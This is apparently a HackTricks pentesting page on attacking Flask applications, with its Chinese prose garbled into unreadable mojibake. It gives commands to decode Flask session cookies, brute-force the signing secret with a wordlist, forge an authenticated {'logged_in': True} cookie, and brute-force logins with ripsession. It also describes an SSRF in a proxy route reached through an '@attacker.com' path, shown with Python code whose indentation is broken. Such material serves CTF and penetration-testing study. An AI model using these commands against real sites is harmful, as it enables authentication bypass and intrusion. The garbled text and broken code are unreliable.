# Flask

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) æ¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**å¦‚æœä½ åœ¨ç©CTFï¼Œå¯èƒ½ä¼šé‡åˆ°ä¸** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/) **ç›¸å…³çš„Flaskåº”ç”¨ç¨‹åºã€‚**

## Cookies

é»˜è®¤çš„cookieä¼šè¯åç§°æ˜¯ **`session`**ã€‚

### è§£ç å™¨

åœ¨çº¿Flask cookiesè§£ç å™¨ï¼š[https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### æ‰‹åŠ¨

è·å–cookieçš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œç›´åˆ°ç¬¬ä¸€ä¸ªç‚¹ï¼Œå¹¶å¯¹å…¶è¿›è¡ŒBase64è§£ç >
```bash
echo "ImhlbGxvIg" | base64 -d
```
Cookie ä¹Ÿä½¿ç”¨å¯†ç è¿›è¡Œäº†ç­¾å

### **Flask-Unsign**

å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºé€šè¿‡çŒœæµ‹å¯†é’¥æ¥è·å–ã€è§£ç ã€æš´åŠ›ç ´è§£å’Œåˆ¶ä½œ Flask åº”ç”¨ç¨‹åºçš„ä¼šè¯ Cookieã€‚

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **è§£ç  Cookie**
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **æš´åŠ›ç ´è§£**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **ç­¾å**
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### ä½¿ç”¨æ—§ç‰ˆæœ¬è¿›è¡Œç­¾å
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

å‘½ä»¤è¡Œå·¥å…·ï¼Œä½¿ç”¨ flask-unsign åˆ¶ä½œçš„ cookies å¯¹ç½‘ç«™è¿›è¡Œæš´åŠ›ç ´è§£ã€‚

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### Flask ä¼šè¯cookieä¸­çš„SQLiä¸SQLmap

[**æ­¤ç¤ºä¾‹**](../../pentesting-web/sql-injection/sqlmap/#eval) ä½¿ç”¨sqlmapçš„ `eval` é€‰é¡¹æ¥**è‡ªåŠ¨ç­¾åsqlmapçš„æœ‰æ•ˆè½½è·**ï¼Œç”¨äºä½¿ç”¨å·²çŸ¥å¯†é’¥çš„flaskã€‚

## Flaskä»£ç†åˆ°SSRF

[**åœ¨è¿™ç¯‡æ–‡ç« ä¸­**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) è§£é‡Šäº†Flaskå¦‚ä½•å…è®¸ä»¥å­—ç¬¦ "@" å¼€å¤´çš„è¯·æ±‚ï¼š
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
åœ¨ä»¥ä¸‹åœºæ™¯ä¸­ï¼š
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
å¯ä»¥å…è®¸å¼•å…¥ç±»ä¼¼ "@attacker.com" çš„å†…å®¹ï¼Œä»¥ä¾¿å¼•èµ· **SSRF**ã€‚

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) æ¥è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒ HackTricks çš„æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
